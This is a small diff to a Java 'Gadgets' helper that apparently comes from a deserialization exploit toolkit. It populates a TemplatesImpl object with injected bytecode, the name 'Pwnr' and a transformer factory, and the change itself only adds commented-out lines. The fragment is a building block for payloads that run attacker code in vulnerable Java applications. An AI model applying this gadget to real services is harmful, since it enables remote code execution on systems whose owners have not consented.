@@ -78,9 +78,10 @@ public class Gadgets {
         Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {
                 classBytes,
                 ClassFiles.classAsBytes(Foo.class)});
-
+//                  classBytes});
         // required to make TemplatesImpl happy
         Reflections.setFieldValue(templates, "_name", "Pwnr");
+//        Reflections.setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
         Reflections.setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
         return templates;
     }
